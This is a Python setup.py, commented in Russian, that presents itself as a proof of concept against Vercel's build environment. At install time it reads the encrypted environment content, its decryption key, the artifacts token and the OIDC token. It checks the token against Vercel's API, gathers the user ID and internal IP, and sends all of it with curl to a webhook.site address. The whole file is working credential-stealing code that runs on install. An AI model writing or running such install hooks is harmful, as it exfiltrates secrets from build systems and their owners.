from setuptools import setup
import os
import subprocess
import base64

# 1. Данные для отправки
webhook_url = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"

# 2. ДЕШИФРОВКА СЕКРЕТОВ (Показываем, что их защита пробита)
# Vercel передает зашифрованные ENV и КЛЮЧ в одну среду. Это критическая ошибка.
enc_env = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', 'Missing')
enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', 'Missing')

# 3. ПРОВЕРКА ПРАВ НА КЭШ (Artifacts Poisoning Proof)
token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
artifacts_proof = ""
if token:
    # Запрашиваем статус, чтобы подтвердить валидность
    cmd = f'curl -s -H "Authorization: Bearer {token}" https://api.vercel.com/v8/artifacts/status'
    artifacts_proof = subprocess.getoutput(cmd)

# 4. СЕТЕВОЕ ОКРУЖЕНИЕ (Поиск внутренних сервисов)
# Проверяем, видит ли билд-контейнер внутреннюю сеть Vercel
internal_ip = subprocess.getoutput("hostname -I")

# 5. ФОРМИРУЕМ ОТЧЕТ
final_payload = f"""
--- CRITICAL INFRASTRUCTURE BREACH POC ---
[+] PRIVILEGES: {subprocess.getoutput('id')}
[+] INTERNAL IP: {internal_ip}

[!] VERCEL SECURITY BYPASS:
Encrypted Content: {enc_env[:50]}... (truncated)
Decryption Key: {enc_key}
(Proof: Since both are in the same environment, any attacker can decrypt user secrets locally)

[!] ARTIFACTS API AUTHENTICATED:
Response: {artifacts_proof}

[!] CRITICAL TOKENS EXFILTRATED:
VERCEL_ARTIFACTS_TOKEN: {token}
VERCEL_OIDC_TOKEN: {os.environ.get('VERCEL_OIDC_TOKEN')}
"""

# Отправляем всё на вебхук
try:
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', final_payload, webhook_url])
except:
    pass

setup(name="vercel-infra-nuclear-poc", version="2.0.0")